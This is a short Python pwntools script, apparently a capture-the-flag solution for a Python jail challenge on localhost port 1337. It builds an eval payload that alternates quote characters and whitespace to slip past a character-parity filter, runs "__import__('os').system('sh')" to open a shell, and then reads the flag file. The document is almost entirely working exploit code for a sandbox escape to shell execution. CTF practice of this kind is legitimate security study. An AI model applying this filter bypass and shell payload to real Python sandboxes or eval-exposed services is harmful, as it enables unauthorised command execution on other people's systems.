#!/usr/bin/env python3
from pwn import *

TARGET = "__import__('os').system('sh')"

# r = process(["python", "chall.py"])
r = remote("localhost", 1337)

# Idea: 'e = eval; e(\t"i"+"m")'
parity = 0
target_oddeven = ""
for c in TARGET:
    q = "'" if ord(c) & 1 == 0 else '"'
    if ord(q) & 1 == parity:
        target_oddeven += "\t" if parity == 0 else " "
    target_oddeven += f"{q}{c}{q}"
    parity = ord(q) & 1

code = f"e = eval; e({target_oddeven})"
print(code)
r.sendlineafter(b">>> ", code.encode())

r.clean(0.5)
r.sendline(b"cat /flag-*")

print(r.clean(0.5).decode())
